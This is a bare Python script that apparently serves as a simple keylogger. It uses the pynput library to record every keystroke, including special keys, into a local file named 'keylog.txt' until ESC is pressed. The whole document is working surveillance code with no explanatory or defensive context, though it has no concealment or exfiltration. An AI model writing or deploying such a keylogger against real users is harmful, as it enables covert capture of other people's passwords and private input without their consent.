import pynput
from pynput.keyboard import Key, Listener

# Specify the log file to save keystrokes
log_file = "keylog.txt"

# List to store key logs
key_log = []

# Function to log key presses
def on_press(key):
    try:
        key_log.append(str(key.char))  # For regular characters
    except AttributeError:
        if key == Key.space:
            key_log.append(" ")  # Convert space to a space character
        elif key == Key.enter:
            key_log.append("\n")  # Newline for enter key
        else:
            key_log.append(f"[{key.name}]")  # Special characters

    # Write keystrokes to the log file
    with open(log_file, "a") as f:
        f.write("".join(key_log))
        key_log.clear()

# Function to stop logging when a certain key is pressed
def on_release(key):
    if key == Key.esc:
        return False  # Stop listener when ESC is pressed

# Listener to monitor keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
